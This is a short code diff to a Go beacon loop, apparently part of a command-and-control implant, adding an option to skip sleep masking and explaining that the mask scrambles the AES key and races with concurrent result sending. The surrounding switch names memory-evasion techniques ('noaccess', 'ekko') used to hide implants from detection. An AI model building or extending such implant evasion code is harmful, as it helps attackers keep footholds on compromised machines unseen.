@@ -177,8 +177,13 @@ func Run(t transport) {
 			}
 		}
 		d := state.next()
-		// Use sleep masking to hide during the beacon sleep interval
+		// Use sleep masking to hide during the beacon sleep interval.
+		// "none" skips masking entirely; used when task goroutines must
+		// call sendResult concurrently (sleep mask scrambles the AES key
+		// in-place, racing with any in-flight seal/open calls).
 		switch SleepMaskMode {
+		case "none", "off", "plain":
+			time.Sleep(d)
 		case "noaccess":
 			sleepMaskNoAccess(uint32(d.Milliseconds()))
 		case "ekko":
